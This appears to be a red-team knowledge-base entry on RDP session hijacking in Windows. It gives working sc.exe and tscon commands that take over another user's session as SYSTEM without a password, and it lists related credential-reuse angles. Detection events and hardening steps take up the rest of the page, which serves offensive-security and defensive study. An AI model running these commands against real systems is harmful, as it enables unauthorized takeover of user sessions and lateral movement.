---
title: "RDP session hijacking"
category: "red-team"
tags: ["lateral-movement", "rdp", "session-hijacking"]
platform: "windows"
mitre: ["T1563.002", "T1021.001"]
difficulty: "intermediate"
updated: "2026-07-12"
author: "core"
---

# RDP session hijacking

## TL;DR
With SYSTEM privileges you can take over another user's existing RDP session **without their password** — including disconnected sessions of admins/other users. A stealthy lateral movement / privilege reuse technique.

## The classic tscon technique (SYSTEM)
```powershell
# List sessions (note the target session ID and user)
query user     # or: qwinsta

# As SYSTEM, connect an existing session to your current one — no password needed
# Create a service that runs tscon as SYSTEM:
sc create hijack binpath= "cmd /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION>"
sc start hijack
# -> you land in the target user's desktop/session
```
```text
Why it works: tscon run as SYSTEM doesn't require the target's credentials.
Getting SYSTEM: PsExec -s, token impersonation (see privesc/token-impersonation).
```

## Other angles
```text
- RDP creds in Credential Manager / DPAPI (see active-directory/dpapi.md) -> reuse.
- Restricted Admin / pass-the-hash over RDP (mstsc /restrictedadmin) where enabled.
- Shadowing sessions (with/without consent depending on policy).
- Bitmap cache / clipboard / mapped drives leaking data from RDP sessions.
```

## Detection (Blue Team)
```text
- Service creation (Event 7045) with tscon in the binpath; sc.exe spawning tscon.
- Session reconnect events (4778/4779) with mismatched user/source.
- SYSTEM process interacting with another user's session; qwinsta/tscon usage.
```

## Mitigation / Hardening
- Prevent SYSTEM-level compromise (that's the real control): patching, least privilege, LAPS, EDR.
- Log off (don't just disconnect) RDP sessions; short disconnected-session timeouts (GPO).
- Restrict who can RDP (tiering, "Deny logon through RDP"), enforce NLA + MFA.
- Monitor 7045/4778/4779; alert on tscon. Related: [remote-exec](./remote-exec.md), [token-impersonation](../privilege-escalation/windows/token-impersonation.md).

## Sources
- [MITRE T1563.002](https://attack.mitre.org/techniques/T1563/002/) · [RDP hijacking (Beaumont)](https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da8d3ea59d92)
